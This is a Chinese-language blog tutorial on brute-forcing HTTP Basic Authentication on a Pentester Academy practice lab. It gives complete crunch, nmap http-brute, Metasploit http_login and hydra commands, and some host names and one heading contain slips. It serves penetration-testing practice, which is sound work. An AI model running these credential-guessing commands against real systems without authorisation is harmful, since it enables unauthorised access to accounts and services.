---
layout:     post
title:      暴力破解HTTP身份验证
subtitle:   
date:       2020-01-28
author:     D
header-img: 
catalog: true
mermaid: true
tags:
    - HTTP Basic Authentication
---

参考:[Bypass HTTP Basic Authentication with Nmap and Metasploit](https://www.kamranmohsin.com/2017/02/bypass-http-basic-authentication-nmap-metasploit/)

# HTTP身份验证介绍

[HTTP身份验证](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication)是在请求特定web资源时提供用户名和密码的一种方法。<br>
客户端以未加密的base64编码文本的形式发送用户名和密码。

当HTTP接收到对受保护资源的匿名请求时，它可以使用401(拒绝访问)状态码拒绝请求，从而强制使用基本身份验证。

```
HTTP/1.1 401 Access Denied
WWW-Authenticate: Basic realm="Server Results"
Content-Length: 0
```

`WWW-Authenticate` 中的单词 `Basic` 表示用户必须使用Basic身份验证方法来访问受保护的资源。<br>
可以将领域设置为描述特定资源中的安全区域的任何值。

```
GET /protectedfiles/ HTTP/1.1
Host: www.kamranmohsin.com
Authorization: Basic adsadWNoOmY=
```

当成功尝试时，HTTP状态变为 200 OK. `adsadWNoOmY=` 是`basic64`编码版本的用户名和密码。

# 用Nmap绕过HTTP身份验证

绕过可以通过 [Nmap](https://nmap.org/) 来完成. Nmap是一款安全扫描器,它一般用于发现计算机网络上的主机和服务. <br>
Nmap附带了130多个NSE脚本，可以帮助发现网络中几乎所有可能的信息.

想要动手练习,请点击[这里](https://pentesteracademylab.appspot.com/lab/webapp/basicauth). 在链接中提供了绕过身份验证的提示.<br>
对于用户名和密码，在Kali Linux中创建两个单独的文件。我先创建一个目录。<br>
```
mkdir demo
cd demo
vi users.txt
```
将可能的用户名nick, admin写入,users.txt里面保存.当然你也可用网上别人整理好的比如[SecLists](https://github.com/dm116/SecLists).<br>

让我们做一个密码文件，根据提示也就是5个字符，只使用a,s,d小写。密码例子asddd, aassd, ssdaa等。<br>

```
crunch 5 5 asd > pass.txt
```
Crunch命令有助于为蛮力强制进行组合。紧随其后的是5个包含asd的最小或最大字符,结果的组合被保存到pass.txt文件中.

现在使用nmap http-brute命令绕过http基本身份验证,下面是命令:
```
nmap -p 80 --script http-brute --script-args 'http-brute.hostname=pentesteracademy
lab.appspot.com, http-brute.method=POST, http-brute.path=/path/webapp/basicauth, 
userdb=/root/demo/users.txt, passdb=/root/demo/pass.txt' -n -v pentesteracademy
lab.appspot.com
```
我们正在检查端口 `80`，主机名(`http-brute.hostname`)应该是你绕过认证的站点。<br>
`方法`和`路径`应该通过查看登录页面的源页面进行确定。<br>
应该给出`users.txt`和`pass.txt`的完整路径。`-n`表示没有dns, `-v` 表示详细模式,最后要写出网站的名称。<br>

# 用Nmap绕过HTTP身份验证

[Metasploit](https://www.metasploit.com/)有助于发现安全问题，验证漏洞缓解&管理安全评估.<br>

命令如下:<br>
```
msfconsole
```
进入 `msf >` 后<br>
```
search http_login
use auxiliary/scanner/http/http_login
```
进入 `msf5 auxiliary(scanner/http/http_login) >` 后<br>
```
show options
set AUTH_URI /lab/webapp/basicauth
set BLANK_PASSWORDS false
set PASS_FILE /root/demo/pass.txt
set REQUESTTYPE POST
set RHOSTS  pentesteracademylay.appspot.com
set STOP_ON_SUCCESS true
set THREADS 20
set USERNAME admin
set VHOST pentesteracademylay.appspot.com
set USER_FILE ''
set USER_AS_PASS false
set USERPASS_FILE ''
run
```
运行命令后，几分钟内您将获得密码aaddd。<br>
如果在不知道 USERNAME 的情况下需要设置 `USER_FILE`, 上面 `set USER_FILE ''`是设置为空的意思.<br>

# hydra暴力破解HTTP身份验证
```
hydra -L users.txt -P pass.txt http-post://pentesteracademylab.appspot.com/lab/webapp/basicauth
```
hydra使用参考 [hydra使用介绍](https://dm116.github.io/2020/01/27/hydra/)
